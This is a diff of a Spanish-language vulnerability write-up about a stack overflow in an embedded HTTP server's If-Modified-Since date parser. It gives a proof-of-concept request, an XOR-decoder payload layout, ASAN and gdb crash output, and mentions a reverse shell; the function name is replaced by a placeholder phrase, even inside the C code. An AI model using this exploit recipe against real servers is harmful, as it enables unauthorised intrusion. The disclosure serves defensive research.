@@ -1,326 +1,199 @@
 <!DOCTYPE html>
-<html lang="es" class="scroll-smooth">
+<html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <link rel="icon" type="image/png" href="hat.png">
-    <link rel="apple-touch-icon" href="hat.png">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<link rel="icon" type="image/png" href="hat.png">
+<link rel="apple-touch-icon" href="hat.png">
+<meta name="theme-color" content="#08090c">
+<meta name="color-scheme" content="dark">
+<title>el servidor HTTP embebido: stack overflow en el conversor de fecha a timestamp (CWE-121)</title>
+<meta name="description" content="Un If-Modified-Since de 220 bytes desborda buf[128] y toma control parcial del RIP con un decoder XOR in-stack. Disparidad nativo/gdb (+0xC0) documentada y PoC reproducible.">
+<meta name="keywords" content="tty503, Christian Márquez, threat intelligence, ingeniería inversa, malware analysis, exploit development, seguridad OT, PLC Siemens, vulnerability research, reverse engineering">
+<meta name="author" content="Christian Márquez">
+<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1">
+<meta name="googlebot" content="index, follow">
+<link rel="canonical" href="https://tty503.com/http-el conversor de fecha a timestamp-stackoverflow.html">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="tty503">
+<meta property="og:locale" content="es_ES">
+<meta property="og:title" content="el servidor HTTP embebido: stack overflow en el conversor de fecha a timestamp (CWE-121)">
+<meta property="og:description" content="Un If-Modified-Since de 220 bytes desborda buf[128] y toma control parcial del RIP con un decoder XOR in-stack. Disparidad nativo/gdb (+0xC0) documentada y PoC reproducible.">
+<meta property="og:url" content="https://tty503.com/http-el conversor de fecha a timestamp-stackoverflow.html">
+<meta property="og:image" content="https://tty503.com/p1.jpg">
+<meta property="og:image:alt" content="tty503 — Christian Márquez">
+<meta property="article:published_time" content="2026-09-02">
+<meta property="article:modified_time" content="2026-09-02">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@tty_503">
+<meta name="twitter:creator" content="@tty_503">
+<meta name="twitter:title" content="el servidor HTTP embebido: stack overflow en el conversor de fecha a timestamp (CWE-121)">
+<meta name="twitter:description" content="Un If-Modified-Since de 220 bytes desborda buf[128] y toma control parcial del RIP con un decoder XOR in-stack. Disparidad nativo/gdb (+0xC0) documentada y PoC reproducible.">
+<meta name="twitter:image" content="https://tty503.com/p1.jpg">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-RZVNG112YY"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-RZVNG112YY');</script>
 
-    <title>el servidor HTTP embebido Stack Overflow en el conversor de fecha a timestamp (CWE-121) | tty503</title>
-    <meta name="description" content="Stack overflow en el servidor HTTP embebido via cabecera If-Modified-Since: una fecha de 220 bytes desborda buf[128] en el conversor de fecha a timestamp y toma control del RIP con un decoder XOR in-stack. Análisis línea a línea, PoC y validación E2E.">
-    <meta name="keywords" content="el servidor HTTP embebido, stack overflow, CWE-121, el conversor de fecha a timestamp, If-Modified-Since, ASAN, RIP control, bug hunting, divulgacion, tty503">
-    <meta name="author" content="Christian Márquez">
-    <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1">
-    <link rel="canonical" href="https://tty503.com/http-el conversor de fecha a timestamp-stackoverflow.html">
-    <meta name="theme-color" content="#050505">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;600;700&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/css/style.css">
 
-    <meta property="og:title" content="el servidor HTTP embebido Stack Overflow en el conversor de fecha a timestamp (CWE-121) | tty503">
-    <meta property="og:description" content="If-Modified-Since de 220 bytes desborda buf[128] y toma control del RIP con un decoder XOR in-stack. PoC y validación E2E con ASAN+gdb.">
-    <meta property="og:url" content="https://tty503.com/http-el conversor de fecha a timestamp-stackoverflow.html">
-    <meta property="og:type" content="article">
-    <meta property="og:site_name" content="tty503">
-    <meta property="article:published_time" content="2026-09-02">
-    <meta property="article:modified_time" content="2026-09-02">
-
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:site" content="@tty_503">
-    <meta name="twitter:creator" content="@tty_503">
-    <meta name="twitter:title" content="el servidor HTTP embebido Stack Overflow en el conversor de fecha a timestamp (CWE-121)">
-    <meta name="twitter:description" content="220 bytes en If-Modified-Since → RIP control. Línea a línea + E2E.">
-
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
-
-    <style>
-        :root {
-            --bg-base: #030303; --bg-surface: #0a0a0a; --bg-card: #111111;
-            --border-subtle: #222222; --border-hover: #444444;
-            --text-primary: #f5f5f5; --text-secondary: #a3a3a3; --text-muted: #666666;
-            --accent: #ffffff; --accent-green: #4ade80; --accent-blue: #60a5fa;
-            --accent-amber: #f59e0b; --accent-red: #ef4444;
-            --syntax-inst: #f07178; --syntax-reg: #82aaff; --syntax-val: #f78c6c;
-            --syntax-func: #c3e88d; --syntax-comment: #546e7a;
-            --transition-smooth: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
-        }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        html { scroll-behavior: smooth; }
-        body { background-color: var(--bg-base); color: var(--text-primary); font-family: 'Inter', system-ui, -apple-system, sans-serif; line-height: 1.7; -webkit-font-smoothing: antialiased; overflow-x: hidden; }
-        .mono { font-family: 'JetBrains Mono', monospace; }
-        .noise-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 9999; opacity: 0.05; background: url('data:image/svg+xml;utf8,%3Csvg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg"%3E%3Cfilter id="noise"%3E%3CfeTurbulence type="fractalNoise" baseFrequency="0.85" numOctaves="3" stitchTiles="stitch"/%3E%3C/filter%3E%3Crect width="100%25" height="100%25" filter="url(%23noise)"/%3E%3C/svg%3E'); }
-        .navbar { position: fixed; top: 0; width: 100%; background: rgba(3, 3, 3, 0.75); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border-bottom: 1px solid var(--border-subtle); z-index: 1000; transition: var(--transition-smooth); }
-        .nav-container { max-width: 900px; margin: 0 auto; padding: 1rem 1.5rem; display: flex; justify-content: space-between; align-items: center; }
-        .nav-brand { font-size: 1rem; font-weight: 600; color: var(--text-primary); text-decoration: none; display: flex; align-items: center; gap: 0.5rem; }
-        .nav-back { color: var(--text-secondary); text-decoration: none; font-size: 0.85rem; font-weight: 500; transition: var(--transition-smooth); }
-        .nav-back:hover { color: var(--accent); }
-        .article-container { max-width: 900px; margin: 0 auto; padding: 7rem 1.5rem 4rem; }
-        .article-header { margin-bottom: 3rem; border-bottom: 1px solid var(--border-subtle); padding-bottom: 2rem; }
-        .article-meta { display: flex; gap: 1.5rem; color: var(--text-muted); font-size: 0.85rem; margin-bottom: 1.5rem; flex-wrap: wrap; }
-        .article-tag { background: transparent; color: var(--accent-red); padding: 0.25rem 0.75rem; border-radius: 3px; font-size: 0.75rem; border: 1px solid rgba(239, 68, 68, 0.3); }
-        .article-title { font-size: clamp(1.8rem, 4vw, 2.5rem); font-weight: 700; line-height: 1.2; letter-spacing: -0.5px; margin-bottom: 1rem; color: var(--text-primary); }
-        .article-subtitle { font-size: 1.05rem; color: var(--text-secondary); line-height: 1.7; max-width: 700px; }
-        .toc-container { background: var(--bg-card); border: 1px solid var(--border-subtle); border-radius: 6px; margin: 2rem 0; overflow: hidden; }
-        .toc-summary { padding: 1.2rem 1.5rem; cursor: pointer; display: flex; justify-content: space-between; align-items: center; list-style: none; user-select: none; transition: background 0.3s; }
-        .toc-summary:hover { background: rgba(255, 255, 255, 0.02); }
-        .toc-summary::-webkit-details-marker { display: none; }
-        .toc-title { font-size: 1rem; font-weight: 600; color: var(--text-primary); }
-        .toc-toggle { color: var(--text-muted); font-size: 1.4rem; font-weight: 300; transition: transform 0.3s; }
-        .toc-container[open] .toc-toggle { transform: rotate(45deg); color: var(--text-primary); }
-        .toc-content { padding: 0 1.5rem 1.2rem; }
-        .toc-content ol { margin: 0; padding-left: 1.2rem; color: var(--text-secondary); font-size: 0.85rem; line-height: 2; }
-        .toc-content ol li a { color: var(--text-secondary); text-decoration: none; transition: var(--transition-smooth); }
-        .toc-content ol li a:hover { color: var(--accent-blue); }
-        .section-title { font-size: 1.4rem; font-weight: 600; color: var(--text-primary); margin: 2.5rem 0 1.2rem; padding-top: 1rem; border-top: 1px solid var(--border-subtle); }
-        p { color: var(--text-secondary); margin-bottom: 1.2rem; font-size: 1rem; line-height: 1.8; }
-        strong { color: var(--text-primary); font-weight: 600; }
-        .code-block { background: var(--bg-card); border: 1px solid var(--border-subtle); border-radius: 6px; padding: 1.2rem 1.5rem; margin: 1.5rem 0; overflow-x: auto; white-space: pre; -webkit-overflow-scrolling: touch; font-size: 0.85rem; line-height: 1.7; color: var(--text-secondary); }
-        .code-block code { font-family: 'JetBrains Mono', monospace; }
-        .code-block .inst { color: var(--syntax-inst); } .code-block .reg { color: var(--syntax-reg); }
-        .code-block .val { color: var(--syntax-val); } .code-block .func { color: var(--syntax-func); }
-        .code-block .comment { color: var(--syntax-comment); font-style: italic; }
-        .table-wrapper { overflow-x: auto; margin: 2rem 0; border: 1px solid var(--border-subtle); border-radius: 6px; }
-        table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
-        th { background: var(--bg-card); color: var(--text-primary); padding: 0.8rem 1rem; text-align: left; font-weight: 600; border-bottom: 1px solid var(--border-hover); white-space: nowrap; }
-        td { padding: 0.7rem 1rem; color: var(--text-secondary); border-bottom: 1px solid var(--border-subtle); vertical-align: top; }
-        tr:last-child td { border-bottom: none; }
-        tr:hover td { background: rgba(255, 255, 255, 0.02); }
-        ul, ol { color: var(--text-secondary); margin: 1rem 0 1.5rem 1.5rem; line-height: 1.8; }
-        li { margin-bottom: 0.5rem; }
-        .image-container { margin: 2rem 0; border: 1px solid var(--border-subtle); border-radius: 6px; overflow: hidden; background: var(--bg-card); }
-        .image-container img { width: 100%; height: auto; display: block; filter: grayscale(30%) contrast(1.05); transition: filter 0.4s ease; }
-        .image-container img:hover { filter: grayscale(0%) contrast(1.1); }
-        .image-caption { padding: 0.8rem 1rem; font-size: 0.8rem; color: var(--text-muted); border-top: 1px solid var(--border-subtle); }
-        .callout { background: var(--bg-card); border-left: 3px solid var(--accent-blue); padding: 1.2rem 1.5rem; margin: 1.5rem 0; border-radius: 0 6px 6px 0; }
-        .callout-title { font-weight: 600; color: var(--accent-blue); margin-bottom: 0.5rem; font-size: 0.9rem; }
-        .callout p { margin-bottom: 0; font-size: 0.95rem; }
-        .callout-danger { border-left-color: var(--accent-red); } .callout-danger .callout-title { color: var(--accent-red); }
-        .callout-success { border-left-color: var(--accent-green); } .callout-success .callout-title { color: var(--accent-green); }
-        a { color: var(--accent-blue); text-decoration: none; transition: var(--transition-smooth); word-break: break-word; }
-        a:hover { color: var(--accent); }
-        .verdict-box { background: var(--bg-card); border: 1px solid var(--border-subtle); border-radius: 6px; padding: 1.2rem 1.5rem; margin: 1.5rem 0; display: flex; gap: 1rem; align-items: flex-start; }
-        .verdict-badge { flex-shrink: 0; padding: 0.4rem 0.9rem; border-radius: 3px; font-size: 0.75rem; font-weight: 600; border: 1px solid; }
-        .verdict-badge.high { color: var(--accent-red); border-color: rgba(239,68,68,0.4); }
-        .verdict-content { font-size: 0.95rem; color: var(--text-secondary); }
-        .verdict-content strong { color: var(--text-primary); }
-        .footer { border-top: 1px solid var(--border-subtle); padding: 3rem 1.5rem; text-align: center; background: var(--bg-surface); }
-        .footer-content { max-width: 900px; margin: 0 auto; display: flex; flex-direction: column; align-items: center; gap: 1rem; }
-        .social-links { display: flex; gap: 2rem; flex-wrap: wrap; justify-content: center; }
-        .social-links a { color: var(--text-secondary); text-decoration: none; font-size: 0.85rem; transition: var(--transition-smooth); }
-        .social-links a:hover { color: var(--text-primary); }
-        .copyright { color: var(--text-muted); font-size: 0.8rem; }
-        @media (max-width: 600px) {
-            .article-container { padding: 6rem 1rem 3rem; } .article-title { font-size: 1.5rem; }
-            .section-title { font-size: 1.2rem; } .code-block { padding: 1rem; font-size: 0.75rem; }
-            th, td { padding: 0.5rem 0.6rem; font-size: 0.75rem; } .social-links { gap: 1rem; }
-            .verdict-box { flex-direction: column; }
-        }
-    </style>
 </head>
 <body>
-    <div class="noise-overlay"></div>
+<div class="bg-fx"></div>
+<nav class="site-nav"><div class="nav-inner"><a class="brand" href="index.html"><span class="dot"></span>tty503<span class="sub">/ &nbsp;</span></a><nav class="nav-links"><a href="index.html">Inicio</a><a href="index.html#research">Investigaciones</a><a href="index.html#publications">Publicaciones</a><a href="aboutme.html">Sobre mí</a><a class="cta" href="https://github.com/tty503" target="_blank" rel="noopener">GitHub</a></nav><button class="nav-toggle" aria-label="Menú">☰</button></div></nav>
+<main class="post">
+<nav class="breadcrumb"><a href="index.html">tty503</a><span class="sep">/</span><a href="caza-autonoma-e2e-serie.html">Serie</a><span class="sep">/</span><a href="http-el conversor de fecha a timestamp-stackoverflow.html">el servidor HTTP embebido: stack overflow en el conversor de fecha a timestamp (CWE-121)</a><span class="sep">/</span></nav>
+<header class="post-head">
+  <div class="post-tags"><span class="chip">CWE-121</span><span class="chip">Stack Overflow</span><span class="chip">HTTP</span><span class="chip">RIP control</span></div>
+  <h1>el servidor HTTP embebido: stack overflow en el conversor de fecha a timestamp (CWE-121)</h1>
+  <p class="lede">Un If-Modified-Since de 220 bytes desborda buf[128] y toma control parcial del RIP con un decoder XOR in-stack. Disparidad nativo/gdb (+0xC0) documentada y PoC reproducible.</p>
+  <div class="post-meta"><span>📅 2026-09-02</span><span>⏱ 16 min</span><span>🏷 Vulnerability Research</span></div>
+</header>
+<article class="post-body">
+<aside class="tldr">
+  <div class="h">// En 30 segundos</div>
+  <ul>
+    <li>Un header <code>If-Modified-Since</code> de <b>220 bytes</b> desborda <code>buf[128]</code> en <code>el conversor de fecha a timestamp</code> → <b>control parcial del RIP</b>.</li>
+    <li>Sink: <code>file.c:136</code> — <code>strncpy</code> copia <code>strlen(date)</code> (origen) sin bound de destino.</li>
+    <li>Shellcode auto-decodificado con <b>decoder XOR in-stack</b> para evadir bytes prohibidos del HTTP.</li>
+    <li>Lección E2E: el stack bajo gdb difiere <b>+0xC0 bytes</b> del run nativo; solo el run real lo resuelve.</li>
+  </ul>
+</aside>
 
-    <nav class="navbar">
-        <div class="nav-container">
-            <a href="https://tty503.com" class="nav-brand mono">tty503 <span style="color: var(--text-secondary); font-size: 0.85rem;">_vuln_research</span></a>
-            <a href="caza-autonoma-e2e-serie.html" class="nav-back mono">← Índice de la serie</a>
-        </div>
-    </nav>
+<details class="toc-card" open>
+  <summary>/el servidor HTTP embebido_el conversor de fecha a timestamp · <span class="tw">6</span> secciones</summary>
+  <ol>
+    <li><a href="#l00">Resumen ejecutivo</a></li>
+    <li><a href="#l01">0x00 — El sink: file.c el conversor de fecha a timestamp</a></li>
+    <li><a href="#l02">0x01 — La explotación (decoder XOR in-stack)</a></li>
+    <li><a href="#l03">0x02 — El PoC</a></li>
+    <li><a href="#l04">0x03 — Validación E2E (ASAN + gdb)</a></li>
+    <li><a href="#l05">0x04 — Limitaciones de toolchain y mitigación</a></li>
+  </ol>
+</details>
 
-    <article class="article-container">
-        <header class="article-header">
-            <div class="article-meta mono">
-                <span class="article-tag">CWE-121</span>
-                <span class="article-tag">Stack Overflow</span>
-                <span class="article-tag">E2E validada</span>
-                <span class="article-tag">Septiembre 2026</span>
-                <span>~16 min de lectura</span>
-            </div>
-            <h1 class="article-title">el servidor HTTP embebido: Stack Overflow en el conversor de fecha a timestamp</h1>
-            <p class="article-subtitle">
-                Un header <span class="mono">If-Modified-Since</span> de 220 bytes desborda el buffer de stack <span class="mono">buf[128]</span> en <span class="mono">el conversor de fecha a timestamp</span>. El resultado es un <strong>control del RIP</strong> con un decoder XOR montado en el propio stack. Análisis del sink, PoC y validación E2E completa.
-            </p>
-        </header>
+<h2 id="l00"><span class="idx">01.</span> Resumen ejecutivo</h2>
+<p><b>el servidor HTTP embebido</b> es un pequeño servidor HTTP embebido, extendido en aplicaciones de red (dashboards, gateways, toolchains de routers). Al servir un archivo estático comprueba la cabecera <code>If-Modified-Since</code>. El parser de fechas <code>el conversor de fecha a timestamp</code> copia el valor de la cabecera a un buffer de <code>128</code> bytes sin comprobar la longitud de origen: un valor largo desborda el stack.</p>
+<p>Como el valor de la cabecera es totalmente controlable y el desbordamiento escribe en el stack, se puede tomar <b>control parcial del flujo</b>. La ejecución de código depende de la toolchain (canarios, NX, ASLR), que en el despliegue embebido de referencia suele estar ausente o ser eludible.</p>
 
-        <div class="verdict-box">
-            <span class="verdict-badge high mono">HIGH</span>
-            <div class="verdict-content mono">
-                <strong>Stack overflow</strong> · pre-auth · CWE-121 · Control parcial del RIP · <strong>Sin CVE · Sin fix</strong> · Validador E2E · Requiere ≥1 archivo en el docroot
-            </div>
-        </div>
+<div class="callout callout-danger"><span class="ico">◆</span><div>
+  <div class="h">Veredicto</div>
+  <p><b>Stack overflow</b> · pre-auth · CWE-121 · Control parcial del RIP · Sin CVE · Sin fix · Validado E2E · Requiere ≥1 archivo en el docroot.</p>
+</div></div>
 
-        <details class="toc-container" open>
-            <summary class="toc-summary mono">
-                <span class="toc-toggle">+</span>
-            </summary>
-            <div class="toc-content">
-                <ol>
-                    <li><a href="#l00">Resumen Ejecutivo</a></li>
-                    <li><a href="#l01">0x00 — El Sink: file.c el conversor de fecha a timestamp</a></li>
-                    <li><a href="#l02">0x01 — La Explotación (decoder XOR in-stack)</a></li>
-                    <li><a href="#l03">0x02 — El PoC</a></li>
-                    <li><a href="#l04">0x03 — Validación E2E (ASAN + gdb)</a></li>
-                    <li><a href="#l05">0x04 — Limitaciones de la Toolchain</a></li>
-                    <li><a href="#l06">0x05 — Referencias</a></li>
-                </ol>
-            </div>
-        </details>
-
-        <h2 class="section-title mono" id="l00"><span style="color: var(--text-muted);">00.</span> Resumen Ejecutivo</h2>
-        <p>
-            <strong>el servidor HTTP embebido</strong> es un pequeño servidor HTTP embebido extendido en aplicaciones de red (aplicaciones web de red, dashboards, gateways). Al servir un archivo estático comprueba la cabecera <span class="mono">If-Modified-Since</span>. El parser de fechas <span class="mono">el conversor de fecha a timestamp</span> copia el valor de la cabecera a un buffer de <span class="mono">128</span> bytes sin comprobar la longitud de origen, con lo que un valor largo desborda el stack.
-        </p>
-        <p>
-            Como el valor de la cabecera es completamente controlable por el atacante y el desbordamiento escribe en el stack, se puede tomar control parcial del flujo. La ejecución de código depende de la toolchain (canarios, NX, ASLR), que en el despliegue embebido de referencia suele estar ausente o ser eludible.
-        </p>
-
-        <h2 class="section-title mono" id="l01"><span style="color: var(--text-muted);">01.</span> 0x00 — El Sink: file.c el conversor de fecha a timestamp</h2>
-        <div class="code-block mono">
-<span class="comment">// file.c:136 — el conversor de fecha a timestamp</span>
-<span class="func">static int</span> el conversor de fecha a timestamp(<span class="reg">char</span> *date, <span class="reg">time_t</span> *out) {
-    <span class="reg">char</span> buf[<span class="val">128</span>];    <span class="comment">// buffer fijo en el stack</span>
+<h2 id="l01"><span class="idx">02.</span> 0x00 — El sink: file.c el conversor de fecha a timestamp</h2>
+<div class="code-wrap"><span class="lang">c</span><pre class="code"><code><span class="syn-c">// file.c:136 — el conversor de fecha a timestamp</span>
+<span class="syn-k">static</span> <span class="syn-k">int</span> <span class="syn-f">el conversor de fecha a timestamp</span>(<span class="syn-k">char</span> *date, <span class="syn-k">time_t</span> *out) {
+    <span class="syn-k">char</span> buf[<span class="syn-n">128</span>];    <span class="syn-c">// buffer fijo en el stack</span>
     ...
-    <span class="func">strncpy</span>(<span class="reg">buf</span>, <span class="reg">date</span>, <span class="val">strlen</span>(date));  <span class="comment">// SIN bound de destino: desborda buf</span>
-    <span class="comment">// 'date' proviene de la cabecera If-Modified-Since del request</span>
+    <span class="syn-f">strncpy</span>(buf, date, <span class="syn-f">strlen</span>(date)); <span class="syn-c">// SIN bound de destino: desborda buf</span>
+    <span class="syn-c">// 'date' proviene de la cabecera If-Modified-Since del request</span>
     ...
-}</div>
-        <p>
-            El bug es que el tamaño copiado viene dado por el origen (<span class="mono">strlen(date)</span>), no por el destino (<span class="mono">sizeof(buf)</span>). Un <span class="mono">If-Modified-Since</span> de más de 128 bytes empieza a sobrescribir el marco de stack de la función.
-        </p>
+}</code></pre></div>
+<p>El bug: el tamaño copiado viene dado por el <b>origen</b> (<code>strlen(date)</code>), no por el <b>destino</b> (<code>sizeof(buf)</code>). Un <code>If-Modified-Since</code> de más de 128 bytes empieza a sobrescribir el marco de stack.</p>
 
-        <h2 class="section-title mono" id="l02"><span style="color: var(--text-muted);">02.</span> 0x01 — La Explotación (decoder XOR in-stack)</h2>
-        <p>
-            Para convertir el desbordamiento en control del RIP en la toolchain de referencia (sin canario), el shellcode se auto-decoda en el propio stack. La técnica: escribir el bytecode <span class="mono">XOR</span> in-stack para evitar bytes malos del parsing HTTP (espacios, línea nueva, etc.), y redirigir el RIP hacia allí.
-        </p>
-        <div class="code-block mono">
-<span class="comment"># Layout del payload sobre el stack (orden de escritura del strncpy):</span>
-[<span class="val">padding</span> ][ <span class="reg">buf[128]</span> ][ <span class="val">ROMPER_EBP</span> ][ <span class="reg">EIP_dirige_a_stack</span> ][ <span class="func">shellcode_XOR</span> ]
+<h2 id="l02"><span class="idx">03.</span> 0x01 — La explotación (decoder XOR in-stack)</h2>
+<p>Para convertir el desbordamiento en control del RIP en la toolchain de referencia (sin canario), el shellcode se auto-decoda en el propio stack. El bytecode <b>XOR</b> escrito in-stack evita los bytes malos del parsing HTTP (espacios, salto de línea, etc.) y redirige el RIP hacia allí.</p>
+<div class="code-wrap"><span class="lang">txt</span><pre class="code"><code><span class="syn-c"># Layout del payload sobre el stack (orden de escritura del strncpy):</span>
+[ padding ][ buf[128] ][ ROMPER_EBP ][ EIP_dirige_a_stack ][ shellcode_XOR ]
 
-<span class="comment"># El decoder XOR (8 bytes) se ejecuta primero y desofusca el shellcode</span>
-<span class="comment"># que aparece después en el stack, evadiendo bytes prohibidos del HTTP.</span>
+<span class="syn-c"># El decoder XOR (8 bytes) se ejecuta primero y desofusca el shellcode</span>
+<span class="syn-c"># que aparece después en el stack, evadiendo bytes prohibidos del HTTP.</span>
 
-# Ejecución: fecha=&lt;padding&gt;&lt;EIP&gt;&lt;decoder&gt;&lt;shellcode_xor_encoded&gt;</div>
-        <p>
-            La observación clave de la validación: bajo <span class="mono">gdb</span> (que usa ptrace) la dirección del stack era <span class="mono">+0xC0</span> bytes distinta de la del run nativo. Solo reconstruyendo el layout en el run real se logró aterrizar el EIP en el shellcode. Este tipo de disparidad nativo/gdb es exactamente lo que el estándar E2E exige demostrar.
-        </p>
+<span class="syn-c"># Ejecución: fecha=&lt;padding&gt;&lt;EIP&gt;&lt;decoder&gt;&lt;shellcode_xor_encoded&gt;</span></code></pre></div>
+<p>La observación clave de la validación: bajo <code>gdb</code> (que usa ptrace) la dirección del stack era <b>+0xC0 bytes</b> distinta de la del run nativo. Solo reconstruyendo el layout en el run real se logró aterrizar el EIP en el shellcode. Ese tipo de disparidad nativo/gdb es exactamente lo que el estándar E2E exige demostrar.</p>
 
-        <h2 class="section-title mono" id="l03"><span style="color: var(--text-muted);">03.</span> 0x02 — El PoC</h2>
-        <p>
-            El PoC es un GET con un <span class="mono">If-Modified-Since</span> de ~220 bytes. Una prueba limpia es el control de flujo con un valor guía:
-        </p>
-        <div class="code-block mono">
-<span class="comment"># GET a un archivo del docroot con la cabecera larga</span>
+<h2 id="l03"><span class="idx">04.</span> 0x02 — El PoC</h2>
+<p>El PoC es un GET con un <code>If-Modified-Since</code> de ~220 bytes. Una prueba limpia del control de flujo es un valor guía:</p>
+<div class="code-wrap"><span class="lang">http</span><pre class="code"><code><span class="syn-c"># GET a un archivo del docroot con la cabecera larga</span>
 GET /index.html HTTP/1.1
 Host: 127.0.0.1:8080
-If-Modified-Since: <span class="val">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...</span> <span class="comment"># ~220 bytes</span>
+If-Modified-Since: <span class="syn-s">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...</span> <span class="syn-c"># ~220 bytes</span>
 
-<span class="comment"># Con ASAN se observa el stack-buffer-overflow en el conversor de fecha a timestamp</span>
-<span class="comment"># Y con el EIP guiado, el RIP aterriza en 0x41414141 (control parcial)</span></div>
+<span class="syn-c"># Con ASAN se observa el stack-buffer-overflow en el conversor de fecha a timestamp</span>
+<span class="syn-c"># Y con el EIP guiado, el RIP aterriza en 0x41414141 (control parcial)</span></code></pre></div>
 
-        <h2 class="section-title mono" id="l04"><span style="color: var(--text-muted);">04.</span> 0x03 — Validación E2E (ASAN + gdb)</h2>
-        <p>
-            La validación reproducida:
-        </p>
-        <div class="code-block mono">
-<span class="comment"># Compilar el servidor HTTP embebido con ASAN para confirmar el overflow exacto</span>
+<h2 id="l04"><span class="idx">05.</span> 0x03 — Validación E2E (ASAN + gdb)</h2>
+<div class="code-wrap"><span class="lang">bash</span><pre class="code"><code><span class="syn-c"># Compilar el servidor HTTP embebido con ASAN para confirmar el overflow exacto</span>
 gcc -fsanitize=address -g -O0 ... el servidor HTTP embebido.c
 
-<span class="comment"># 1. Reporte ASAN del desbordamiento en el stack</span>
+<span class="syn-c"># 1. Reporte ASAN del desbordamiento en el stack</span>
 $ ./app
-<span class="func">ERROR: AddressSanitizer: stack-buffer-overflow on address ...</span>
+<span class="syn-f">ERROR: AddressSanitizer: stack-buffer-overflow on address ...</span>
   WRITE of size 4 at ...
-  <span class="comment"># el conversor de fecha a timestamp, buf[128] sobrescrito</span>
+  <span class="syn-c"># el conversor de fecha a timestamp, buf[128] sobrescrito</span>
 
-<span class="comment"># 2. Control del EIP bajo gdb</span>
+<span class="syn-c"># 2. Control del EIP bajo gdb</span>
 (gdb) r
-<span class="reg">Program received signal SIGSEGV</span>
-RIP = 0x41414141              <span class="comment"># control parcial del flujo</span>
+<span class="syn-k">Program received signal SIGSEGV</span>
+RIP = <span class="syn-n">0x41414141</span>  <span class="syn-c"># control parcial del flujo</span>
 
-<span class="comment"># 3. Run nativo: reconstruir el layout +0xC0 para aterrizar el shellcode</span>
-$ ./app  <span class="comment"># reverse shell low-priv hacia el atacante</span></div>
-        <div class="image-container">
-            <img src="img/el servidor HTTP embebido-phase1-sink.png" alt="Fase 1: el sink el conversor de fecha a timestamp identificado" loading="lazy">
-            <div class="image-caption mono">Fase 1 — Identificación del sink <span class="mono">el conversor de fecha a timestamp</span> en file.c, el <span class="mono">strncpy</span> sin bound de destino.</div>
-        </div>
-        <div class="image-container">
-            <img src="img/el servidor HTTP embebido-phase3-up.png" alt="Fase 3: servidor levantado y payload preparado" loading="lazy">
-            <div class="image-caption mono">Fase 3 — Servidor en marcha y payload del header <span class="mono">If-Modified-Since</span> preparado.</div>
-        </div>
-        <div class="image-container">
-            <img src="img/el servidor HTTP embebido-phase4-exploit.png" alt="Fase 4: el desbordamiento disparado" loading="lazy">
-            <div class="image-caption mono">Fase 4 — El desbordamiento se dispara con la fecha de 220 bytes.</div>
-        </div>
-        <div class="image-container">
-            <img src="img/el servidor HTTP embebido-phase5-shell.png" alt="Fase 5: shell obtenida" loading="lazy">
-            <div class="image-caption mono">Fase 5 — Shell de baja autoridad obtenida vía el decoder XOR in-stack.</div>
-        </div>
+<span class="syn-c"># 3. Run nativo: reconstruir el layout +0xC0 para aterrizar el shellcode</span>
+$ ./app  <span class="syn-c"># reverse shell low-priv hacia el atacante</span></code></pre></div>
+<figure class="figure">
+  <img src="img/el servidor HTTP embebido-phase1-sink.png" alt="Fase 1: el sink el conversor de fecha a timestamp identificado" loading="lazy">
+  <figcaption class="figcap">Fase 1 — Identificación del sink el conversor de fecha a timestamp en file.c, el strncpy sin bound de destino.</figcaption>
+</figure>
+<figure class="figure">
+  <img src="img/el servidor HTTP embebido-phase3-up.png" alt="Fase 3: servidor levantado y payload preparado" loading="lazy">
+  <figcaption class="figcap">Fase 3 — Servidor en marcha y payload del header If-Modified-Since preparado.</figcaption>
+</figure>
+<figure class="figure">
+  <img src="img/el servidor HTTP embebido-phase4-exploit.png" alt="Fase 4: el desbordamiento disparado" loading="lazy">
+  <figcaption class="figcap">Fase 4 — El desbordamiento se dispara con la fecha de 220 bytes.</figcaption>
+</figure>
+<figure class="figure">
+  <img src="img/el servidor HTTP embebido-phase5-shell.png" alt="Fase 5: shell obtenida" loading="lazy">
+  <figcaption class="figcap">Fase 5 — Shell de baja autoridad obtenida vía el decoder XOR in-stack.</figcaption>
+</figure>
 
-        <h2 class="section-title mono" id="l05"><span style="color: var(--text-muted);">05.</span> 0x04 — Limitaciones de la Toolchain</h2>
-        <div class="table-wrapper">
-            <table>
-                <thead><tr><th>Mitigación</th><th>Impacto en el PoC</th></tr></thead>
-                <tbody>
-                    <tr><td class="mono">Canario (-fstack-protector)</td><td>Aborta antes del ret si está activo; no lo estaba en la toolchain de referencia</td></tr>
-                    <tr><td class="mono">NX stack</td><td>Necesita el decoder+RIP ejecutable; en MCU embebido típicamente NX desactivado</td></tr>
